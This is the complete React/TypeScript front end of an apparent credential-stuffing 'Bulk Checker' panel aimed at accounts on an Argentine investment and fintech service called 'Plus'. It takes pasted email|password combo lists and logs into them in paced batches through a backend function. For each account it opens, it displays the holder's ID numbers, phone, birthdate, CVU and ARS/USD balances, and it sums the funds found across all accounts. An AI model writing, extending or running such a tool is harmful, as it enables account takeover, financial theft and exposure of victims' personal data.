import { useState, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import {
  Loader2, TrendingUp, Upload, Eye, DollarSign, Wallet, Database,
  Pause, Play, ChevronDown, ChevronUp, Users, Shield, Copy, Check,
  BarChart3, Activity, Zap, ArrowUpRight, ArrowDownRight
} from "lucide-react";
import SavedAccountsTab from "@/components/plus/SavedAccountsTab";

interface AccountResult {
  success: boolean;
  email: string;
  error?: string;
  accessToken?: string;
  profile?: any;
  balances?: any;
  fintech?: any;
  limits?: any;
  crypto?: any;
}

const PanelPlus = () => {
  const [mode, setMode] = useState<"bulk" | "saved" | "single">("bulk");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [bulkInput, setBulkInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState({ done: 0, total: 0 });
  const [results, setResults] = useState<AccountResult[]>([]);
  const [expandedRow, setExpandedRow] = useState<string | null>(null);
  const [singleData, setSingleData] = useState<AccountResult | null>(null);
  const [paused, setPaused] = useState(false);
  const pausedRef = useRef(false);
  const { toast } = useToast();

  const handleSingleLogin = async () => {
    if (!email || !password) return;
    setLoading(true);
    try {
      const { data: res, error } = await supabase.functions.invoke("plus-auth", {
        body: { action: "login", email, password, operatorCode: "master" },
      });
      if (error || !res?.success) {
        toast({ title: "Erro no login", description: res?.error || "Credenciais inválidas", variant: "destructive" });
        return;
      }
      setSingleData(res);
      toast({ title: "Login realizado", description: `Bem-vindo, ${res.profile.first_name}` });
    } catch (e: any) {
      toast({ title: "Erro", description: e.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const parseBulkInput = (text: string) => {
    return text
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line.length > 0)
      .map((line) => {
        const parts = line.includes(":") ? line.split(":").slice(1).join(":") : line;
        const [em, pw] = parts.split("|").map((s) => s.trim());
        return { email: em, password: pw };
      })
      .filter((a) => a.email && a.password);
  };

  const handleBulkCheck = async () => {
    const accounts = parseBulkInput(bulkInput);
    if (accounts.length === 0) {
      toast({ title: "Nenhuma conta", description: "Cole as contas no formato email|senha", variant: "destructive" });
      return;
    }
    setLoading(true);
    setPaused(false);
    pausedRef.current = false;
    setResults([]);
    setProgress({ done: 0, total: accounts.length });

    const allResults: AccountResult[] = [];
    const batchSize = 3;

    for (let i = 0; i < accounts.length; i += batchSize) {
      while (pausedRef.current) {
        await new Promise((resolve) => setTimeout(resolve, 500));
      }
      const batch = accounts.slice(i, i + batchSize);
      try {
        const { data: res, error } = await supabase.functions.invoke("plus-auth", {
          body: { action: "bulk", accounts: batch, operatorCode: "master" },
        });
        if (error) {
          batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: "Falha na requisição" }));
        } else {
          allResults.push(...(res.results || []));
        }
      } catch (e: any) {
        batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: e.message }));
      }
      setResults([...allResults]);
      setProgress({ done: Math.min(i + batchSize, accounts.length), total: accounts.length });

      if (i + batchSize < accounts.length) {
        await new Promise((resolve) => setTimeout(resolve, 2000));
      }
    }

    const ok = allResults.filter((r) => r.success).length;
    toast({ title: "Concluído", description: `${ok}/${accounts.length} contas consultadas com sucesso` });
    setLoading(false);
    setPaused(false);
    pausedRef.current = false;
    setProgress({ done: 0, total: 0 });
  };

  const togglePause = () => {
    const newVal = !pausedRef.current;
    pausedRef.current = newVal;
    setPaused(newVal);
  };

  const formatARS = (val: number | undefined) =>
    val != null ? `$ ${val.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "—";

  const formatUSD = (val: number | undefined) =>
    val != null ? `US$ ${val.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "—";

  const successCount = results.filter((r) => r.success).length;
  const failCount = results.filter((r) => !r.success).length;
  const totalARS = results.filter(r => r.success).reduce((s, r) => s + (r.balances?.ars || 0) + (r.fintech?.balance || 0), 0);
  const totalUSD = results.filter(r => r.success).reduce((s, r) => s + (r.balances?.usd || 0), 0);

  const tabs = [
    { key: "bulk" as const, icon: Upload, label: "Bulk Checker" },
    { key: "saved" as const, icon: Database, label: "Contas Salvas" },
    { key: "single" as const, icon: Eye, label: "Login Único" },
  ];

  return (
    <div className="min-h-screen bg-[#0a0e17]">
      {/* Top Bar */}
      <div className="border-b border-white/5 bg-[#0d1220]/80 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-[1600px] mx-auto px-4 md:px-6 h-14 flex items-center gap-4">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-green-400 to-emerald-600 flex items-center justify-center shadow-lg shadow-emerald-500/20">
              <TrendingUp className="w-4 h-4 text-white" />
            </div>
            <span className="text-white font-bold text-lg tracking-tight">Plus</span>
            <span className="text-white/20 text-sm font-light ml-1">Panel</span>
          </div>

          <div className="ml-6 flex items-center gap-1 bg-white/[0.03] rounded-lg p-0.5">
            {tabs.map(({ key, icon: Icon, label }) => (
              <button
                key={key}
                onClick={() => setMode(key)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                  mode === key
                    ? "bg-emerald-500/15 text-emerald-400 shadow-sm"
                    : "text-white/40 hover:text-white/60 hover:bg-white/[0.03]"
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                {label}
              </button>
            ))}
          </div>

          <div className="ml-auto flex items-center gap-3">
            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-emerald-500/10 border border-emerald-500/20">
              <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              <span className="text-emerald-400 text-[10px] font-medium uppercase tracking-wider">Online</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-[1600px] mx-auto px-4 md:px-6 py-6">
        {mode === "single" ? (
          <SingleMode
            email={email}
            setEmail={setEmail}
            password={password}
            setPassword={setPassword}
            loading={loading}
            onLogin={handleSingleLogin}
            data={singleData}
            formatARS={formatARS}
            formatUSD={formatUSD}
          />
        ) : mode === "saved" ? (
          <SavedAccountsTab />
        ) : (
          <div className="space-y-5">
            {/* Bulk Input Area */}
            <div className="rounded-xl border border-white/[0.06] bg-[#111827]/60 backdrop-blur-sm overflow-hidden">
              <div className="px-5 py-3.5 border-b border-white/[0.04] flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <Zap className="w-4 h-4 text-emerald-400" />
                  <span className="text-white/90 text-sm font-medium">Bulk Checker</span>
                  <span className="text-white/20 text-xs">— cole as credenciais abaixo</span>
                </div>
                <span className="text-white/30 text-xs font-mono">
                  {parseBulkInput(bulkInput).length} contas
                </span>
              </div>

              <div className="p-4">
                <textarea
                  value={bulkInput}
                  onChange={(e) => setBulkInput(e.target.value)}
                  placeholder={`email@exemplo.com|senha123\noutro@email.com|Senha456`}
                  rows={5}
                  className="w-full bg-[#0a0e17] border border-white/[0.06] rounded-lg p-3.5 text-white/80 text-[13px] font-mono placeholder:text-white/15 focus:outline-none focus:ring-1 focus:ring-emerald-500/30 focus:border-emerald-500/20 resize-y transition-all"
                />
              </div>

              <div className="px-4 pb-4 flex items-center justify-between">
                <div className="text-white/20 text-[11px]">
                  Formato: <code className="text-emerald-400/60 bg-emerald-500/5 px-1 py-0.5 rounded">email|senha</code>
                </div>
                <div className="flex gap-2">
                  {loading && (
                    <Button
                      onClick={togglePause}
                      size="sm"
                      className={`h-8 text-xs font-medium ${
                        paused
                          ? "bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20"
                          : "bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 border border-amber-500/20"
                      }`}
                      variant="ghost"
                    >
                      {paused ? <Play className="w-3.5 h-3.5 mr-1" /> : <Pause className="w-3.5 h-3.5 mr-1" />}
                      {paused ? "Retomar" : "Pausar"}
                    </Button>
                  )}
                  <Button
                    onClick={handleBulkCheck}
                    disabled={loading || parseBulkInput(bulkInput).length === 0}
                    size="sm"
                    className="h-8 bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs px-5 shadow-lg shadow-emerald-500/20 disabled:opacity-30 disabled:shadow-none"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="animate-spin mr-1.5 w-3.5 h-3.5" />
                        {paused ? "Pausado" : progress.total > 0 ? `${progress.done}/${progress.total}` : "..."}
                      </>
                    ) : (
                      <>
                        <Zap className="w-3.5 h-3.5 mr-1" />
                        Iniciar Consulta
                      </>
                    )}
                  </Button>
                </div>
              </div>

              {loading && progress.total > 0 && (
                <div className="px-4 pb-3">
                  <div className="w-full bg-white/[0.03] rounded-full h-1 overflow-hidden">
                    <div
                      className="h-full bg-gradient-to-r from-emerald-500 to-emerald-400 transition-all duration-700 ease-out"
                      style={{ width: `${(progress.done / progress.total) * 100}%` }}
                    />
                  </div>
                </div>
              )}
            </div>

            {/* Stats Cards - only show when results exist */}
            {results.length > 0 && (
              <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
                <StatCard icon={Activity} label="Total" value={results.length.toString()} color="white" />
                <StatCard icon={Check} label="Sucesso" value={successCount.toString()} color="emerald" />
                <StatCard icon={Shield} label="Falha" value={failCount.toString()} color="red" />
                <StatCard icon={DollarSign} label="Total ARS" value={formatARS(totalARS)} color="emerald" mono />
                <StatCard icon={DollarSign} label="Total USD" value={formatUSD(totalUSD)} color="blue" mono />
              </div>
            )}

            {/* Results Table */}
            {results.length > 0 && (
              <div className="rounded-xl border border-white/[0.06] bg-[#111827]/60 backdrop-blur-sm overflow-hidden">
                <div className="px-5 py-3.5 border-b border-white/[0.04] flex items-center justify-between">
                  <div className="flex items-center gap-2.5">
                    <BarChart3 className="w-4 h-4 text-emerald-400" />
                    <span className="text-white/90 text-sm font-medium">Resultados</span>
                    <span className="ml-2 text-[10px] font-medium px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                      {successCount}/{results.length}
                    </span>
                  </div>
                </div>

                <div className="overflow-x-auto">
                  <table className="w-full text-[13px]">
                    <thead>
                      <tr className="border-b border-white/[0.04]">
                        {["#", "Status", "Nome", "Email", "DNI", "ARS", "USD", "Fintech", ""].map((h, i) => (
                          <th key={i} className={`py-2.5 px-3 text-[10px] font-medium uppercase tracking-wider text-white/25 ${i >= 5 && i <= 7 ? "text-right" : "text-left"}`}>
                            {h}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {results.map((r, i) => (
                        <ResultRow
                          key={r.email + i}
                          result={r}
                          index={i}
                          expanded={expandedRow === r.email}
                          onToggle={() => setExpandedRow(expandedRow === r.email ? null : r.email)}
                          formatARS={formatARS}
                          formatUSD={formatUSD}
                        />
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

// ── Stat Card ──
const StatCard = ({ icon: Icon, label, value, color, mono }: {
  icon: any; label: string; value: string; color: string; mono?: boolean;
}) => {
  const colorMap: Record<string, string> = {
    emerald: "text-emerald-400 bg-emerald-500/10 border-emerald-500/10",
    blue: "text-blue-400 bg-blue-500/10 border-blue-500/10",
    red: "text-red-400 bg-red-500/10 border-red-500/10",
    white: "text-white/70 bg-white/[0.03] border-white/[0.04]",
  };
  const c = colorMap[color] || colorMap.white;
  const textColor = color === "emerald" ? "text-emerald-400" : color === "blue" ? "text-blue-400" : color === "red" ? "text-red-400" : "text-white";

  return (
    <div className={`rounded-lg border p-3 ${c}`}>
      <div className="flex items-center gap-2 mb-1.5">
        <Icon className="w-3.5 h-3.5 opacity-50" />
        <span className="text-[10px] font-medium uppercase tracking-wider opacity-50">{label}</span>
      </div>
      <p className={`text-lg font-bold ${textColor} ${mono ? "font-mono text-sm" : ""} truncate`}>{value}</p>
    </div>
  );
};

// ── Result Row ──
const ResultRow = ({
  result: r, index, expanded, onToggle, formatARS, formatUSD,
}: {
  result: AccountResult; index: number; expanded: boolean; onToggle: () => void;
  formatARS: (v: number | undefined) => string; formatUSD: (v: number | undefined) => string;
}) => {
  if (!r.success) {
    return (
      <tr className="border-b border-white/[0.03] hover:bg-white/[0.02] transition-colors">
        <td className="py-2.5 px-3 text-white/20 font-mono text-xs">{index + 1}</td>
        <td className="py-2.5 px-3">
          <span className="inline-flex items-center gap-1 text-[10px] font-medium px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/15">
            ✕ Erro
          </span>
        </td>
        <td className="py-2.5 px-3 text-white/30 text-xs" colSpan={5}>{r.error || "Login falhou"}</td>
        <td className="py-2.5 px-3 text-white/20 text-xs font-mono">{r.email}</td>
        <td />
      </tr>
    );
  }

  const name = `${r.profile?.first_name || ""} ${r.profile?.last_name || ""}`.trim();

  return (
    <>
      <tr
        className="border-b border-white/[0.03] hover:bg-emerald-500/[0.03] transition-colors cursor-pointer group"
        onClick={onToggle}
      >
        <td className="py-2.5 px-3 text-white/20 font-mono text-xs">{index + 1}</td>
        <td className="py-2.5 px-3">
          <span className="inline-flex items-center gap-1 text-[10px] font-medium px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/15">
            ✓ OK
          </span>
        </td>
        <td className="py-2.5 px-3 text-white/90 font-medium">{name}</td>
        <td className="py-2.5 px-3 text-white/40 font-mono text-xs">{r.email}</td>
        <td className="py-2.5 px-3 text-white/40">{r.profile?.document || "—"}</td>
        <td className="py-2.5 px-3 text-right text-emerald-400 font-mono">{formatARS(r.balances?.ars)}</td>
        <td className="py-2.5 px-3 text-right text-blue-400 font-mono">{formatUSD(r.balances?.usd)}</td>
        <td className="py-2.5 px-3 text-right text-purple-400 font-mono">{formatARS(r.fintech?.balance)}</td>
        <td className="py-2.5 px-3 text-center text-white/15 group-hover:text-white/40 transition-colors">
          {expanded ? <ChevronUp className="w-3.5 h-3.5 inline" /> : <ChevronDown className="w-3.5 h-3.5 inline" />}
        </td>
      </tr>
      {expanded && (
        <tr className="bg-white/[0.015]">
          <td colSpan={9} className="p-5">
            <ExpandedDetails result={r} formatARS={formatARS} formatUSD={formatUSD} />
          </td>
        </tr>
      )}
    </>
  );
};

// ── Expanded Details ──
const ExpandedDetails = ({
  result: r, formatARS, formatUSD,
}: {
  result: AccountResult; formatARS: (v: number | undefined) => string; formatUSD: (v: number | undefined) => string;
}) => {
  const p = r.profile?.profile || {};

  const DataItem = ({ label, value, color }: { label: string; value: string; color?: string }) => (
    <div className="flex items-center justify-between py-1.5 border-b border-white/[0.03] last:border-0">
      <span className="text-white/25 text-xs">{label}</span>
      <span className={`text-xs font-mono ${color || "text-white/70"}`}>{value}</span>
    </div>
  );

  return (
    <div className="grid grid-cols-2 md:grid-cols-4 gap-5">
      <div className="space-y-0.5">
        <div className="flex items-center gap-1.5 mb-2.5">
          <DollarSign className="w-3 h-3 text-emerald-400/60" />
          <span className="text-[10px] font-semibold uppercase tracking-wider text-emerald-400/60">Saldos</span>
        </div>
        <DataItem label="ARS" value={formatARS(r.balances?.ars)} color="text-emerald-400" />
        <DataItem label="USD" value={formatUSD(r.balances?.usd)} color="text-blue-400" />
        <DataItem label="Pend. ARS" value={formatARS(r.balances?.pendingARS)} color="text-amber-400/70" />
        <DataItem label="Pend. USD" value={formatUSD(r.balances?.pendingUSD)} color="text-amber-400/70" />
        <DataItem label="Fintech" value={formatARS(r.fintech?.balance)} color="text-purple-400" />
        <DataItem label="CVU" value={r.fintech?.cvu || "—"} />
      </div>
      <div className="space-y-0.5">
        <div className="flex items-center gap-1.5 mb-2.5">
          <Users className="w-3 h-3 text-blue-400/60" />
          <span className="text-[10px] font-semibold uppercase tracking-wider text-blue-400/60">Pessoais</span>
        </div>
        <DataItem label="CUIT" value={r.profile?.cuit || "—"} />
        <DataItem label="Telefone" value={p.telephone || "—"} />
        <DataItem label="Cidade" value={p.city || "—"} />
        <DataItem label="Província" value={p.province?.name || "—"} />
        <DataItem label="Nascimento" value={p.birthdateString || "—"} />
        <DataItem label="Atividade" value={p.activity?.description || "—"} />
      </div>
      <div className="space-y-0.5">
        <div className="flex items-center gap-1.5 mb-2.5">
          <Wallet className="w-3 h-3 text-purple-400/60" />
          <span className="text-[10px] font-semibold uppercase tracking-wider text-purple-400/60">Conta</span>
        </div>
        <DataItem label="Conta #" value={r.profile?.inversorAccount?.toString() || "—"} />
        <DataItem label="Canal" value={r.profile?.channel || "—"} />
        <DataItem label="Criado" value={r.profile?.created_at?.split(" ")[0] || "—"} />
        <DataItem label="Referido" value={r.profile?.referral_code || "—"} />
      </div>
      <div className="space-y-0.5">
        <div className="flex items-center gap-1.5 mb-2.5">
          <Shield className="w-3 h-3 text-amber-400/60" />
          <span className="text-[10px] font-semibold uppercase tracking-wider text-amber-400/60">Status</span>
        </div>
        {[
          ["Inversões", r.profile?.allowInversions],
          ["Inversor Ativo", r.profile?.isInversorActive],
          ["Crypto", r.profile?.allowCrypto],
          ["Fintech", r.fintech?.allowed],
          ["Válido", r.profile?.valid === 1],
          ["Bloqueado", r.profile?.blocked === 1],
        ].map(([label, active]) => (
          <div key={label as string} className="flex items-center justify-between py-1.5 border-b border-white/[0.03] last:border-0">
            <span className="text-white/25 text-xs">{label}</span>
            <span className={`text-xs ${active ? "text-emerald-400" : "text-red-400/60"}`}>
              {active ? "✓ Sim" : "✕ Não"}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
};

// ── Single Mode ──
const SingleMode = ({
  email, setEmail, password, setPassword, loading, onLogin, data, formatARS, formatUSD,
}: {
  email: string; setEmail: (v: string) => void;
  password: string; setPassword: (v: string) => void;
  loading: boolean; onLogin: () => void;
  data: AccountResult | null;
  formatARS: (v: number | undefined) => string;
  formatUSD: (v: number | undefined) => string;
}) => {
  if (!data) {
    return (
      <div className="max-w-sm mx-auto mt-20">
        <div className="rounded-xl border border-white/[0.06] bg-[#111827]/60 backdrop-blur-sm p-6">
          <div className="text-center mb-6">
            <div className="mx-auto w-12 h-12 rounded-xl bg-gradient-to-br from-green-400 to-emerald-600 flex items-center justify-center mb-3 shadow-lg shadow-emerald-500/20">
              <TrendingUp className="w-5 h-5 text-white" />
            </div>
            <h2 className="text-white font-bold text-lg">Login Único</h2>
            <p className="text-white/30 text-xs mt-1">Consultar uma conta Plus</p>
          </div>
          <div className="space-y-3">
            <Input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email"
              className="bg-[#0a0e17] border-white/[0.06] text-white placeholder:text-white/15 h-9 text-sm focus:ring-emerald-500/30 focus:border-emerald-500/20"
            />
            <Input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Senha"
              className="bg-[#0a0e17] border-white/[0.06] text-white placeholder:text-white/15 h-9 text-sm focus:ring-emerald-500/30 focus:border-emerald-500/20"
              onKeyDown={(e) => e.key === "Enter" && onLogin()}
            />
            <Button
              onClick={onLogin}
              disabled={loading || !email || !password}
              className="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-semibold h-9 text-sm shadow-lg shadow-emerald-500/20"
            >
              {loading ? <Loader2 className="animate-spin mr-2 w-4 h-4" /> : null}
              {loading ? "Entrando..." : "Consultar"}
            </Button>
          </div>
        </div>
      </div>
    );
  }

  const name = `${data.profile?.first_name || ""} ${data.profile?.last_name || ""}`.trim();
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3">
        <div className="w-10 h-10 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 font-bold text-sm">
          {name.charAt(0)}
        </div>
        <div>
          <h2 className="text-white font-bold">{name}</h2>
          <p className="text-white/30 text-xs">{data.email}</p>
        </div>
        <Button onClick={() => window.location.reload()} variant="ghost" size="sm" className="ml-auto text-white/30 hover:text-white/60 text-xs">
          Nova consulta
        </Button>
      </div>
      <div className="rounded-xl border border-white/[0.06] bg-[#111827]/60 backdrop-blur-sm p-5">
        <ExpandedDetails result={data} formatARS={formatARS} formatUSD={formatUSD} />
      </div>
    </div>
  );
};

export default PanelPlus;
